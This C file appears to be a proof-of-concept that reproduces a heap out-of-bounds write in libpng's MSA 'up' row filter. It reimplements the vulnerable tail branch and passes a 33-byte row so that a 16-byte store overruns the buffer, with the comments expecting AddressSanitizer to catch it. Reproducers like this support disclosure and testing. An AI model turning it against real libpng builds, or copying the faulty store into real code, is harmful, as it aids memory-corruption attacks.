#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* Minimal stand-ins for libpng types */
typedef unsigned char png_byte;
typedef struct png_row_info {
    size_t width;
    size_t rowbytes;
    int color_type;
    int bit_depth;
} png_row_info;

/* Minimal 16-byte vector stand-in */
typedef struct { png_byte b[16]; } v16u8;

/* Stubbed vector ops: we avoid real loads to prevent OOB reads masking the write. */
static inline v16u8 ld_ub_stub(void) {
    v16u8 v;
    /* Fill with a pattern; content is irrelevant to trigger the write OOB. */
    memset(v.b, 0xA5, 16);
    return v;
}

static inline v16u8 add_stub(v16u8 a, v16u8 b) {
    v16u8 r;
    /* Byte-wise add modulo 256 (for realism); not required for the OOB trigger. */
    for (int i = 0; i < 16; ++i) r.b[i] = (png_byte)(a.b[i] + b.b[i]);
    return r;
}

/* Macros mimicking the MSA helper macros used in the vulnerable code */
#define LD_UB(p)            (ld_ub_stub())                 /* Do not dereference p */
#define LD_UB2(p, s, a, b)  do { (a) = ld_ub_stub(); (b) = ld_ub_stub(); } while (0)
#define ST_UB(v, p)         do { memcpy((p), (v).b, 16); } while (0)
#define ST_UB2(a, b, p, s)  do { memcpy((p),        (a).b, 16); \
                                 memcpy((p) + (s), (b).b, 16); } while (0)
#define ADD3(a,b,c,d,e,f,o0,o1,o2) do { (o0) = add_stub((a),(b)); \
                                       (o1) = add_stub((c),(d)); \
                                       (o2) = add_stub((e),(f)); } while (0)

/* Reimplementation of just the tail case from png_read_filter_row_up_msa
   that contains the bug at line 409 in the original file. */
static void png_read_filter_row_up_msa(png_row_info *row_info, png_byte *row, const png_byte *prev_row)
{
    size_t istop = row_info->rowbytes;   /* Number of bytes to process */
    png_byte *rp = row;
    const png_byte *pp = prev_row;

    /* Only the tail (istop & 0x3F) path is needed to demonstrate the bug. */
    if (istop & 0x3F)
    {
        size_t cnt32 = istop & 0x20;
        size_t cnt16 = istop & 0x10;
        size_t cnt   = istop & 0xF;

        if (cnt32)
        {
            if (cnt16 && cnt)
            {
                /* Not taken for our crafted input. */
            }
            else if (cnt16 || cnt)
            {
                /* Vulnerable tail path (source lines 399..411, bug at 409). */
                v16u8 src0, src1, src2, src4, src5, src6;

                LD_UB2(rp, 16, src0, src1);     /* loads from current row */
                LD_UB2(pp, 16, src4, src5);     /* loads from prev row */
                pp += 32;
                src2 = LD_UB(rp + 32);
                src6 = LD_UB(pp);

                ADD3(src0, src4, src1, src5, src2, src6, src0, src1, src2);

                ST_UB2(src0, src1, rp, 16);     /* writes 32 bytes */
                rp += 32;
                ST_UB(src2, rp);                /* BUG: writes 16 more bytes, may overflow */
                rp += 16;
            }
            else
            {
                /* Not taken for our crafted input. */
            }
        }
    }
}

int main(void)
{
    /* Craft rowbytes so that: (istop & 0x20) != 0, and exactly one of
       (istop & 0x10) or (istop & 0xF) is non-zero. For 33 bytes:
         - cnt32 = 0x20 set
         - cnt16 = 0
         - cnt   = 1
       This drives execution into the vulnerable branch and causes a 16-byte
       store after 32 bytes have already been written, overrunning by 15 bytes. */
    const size_t rowbytes = 33;  /* 33..47 all trigger; 33 is minimal overflow */

    png_row_info info;
    info.width = rowbytes;   /* Not used here */
    info.rowbytes = rowbytes;
    info.color_type = 0;
    info.bit_depth = 8;

    /* Allocate exactly rowbytes for the destination row so the 16-byte tail
       store at offset 32 overruns the buffer. */
    png_byte *row = (png_byte*)malloc(rowbytes);
    if (!row) { perror("malloc row"); return 1; }
    memset(row, 0x11, rowbytes);

    /* prev_row size is irrelevant for the write OOB; give it some space. */
    png_byte *prev_row = (png_byte*)malloc(64);
    if (!prev_row) { perror("malloc prev_row"); return 1; }
    memset(prev_row, 0x22, 64);

    /* Call the vulnerable routine: ASan should report an OOB write. */
    png_read_filter_row_up_msa(&info, row, prev_row);

    /* Cleanup (not reached if ASan aborts on error). */
    free(prev_row);
    free(row);

    return 0;
}
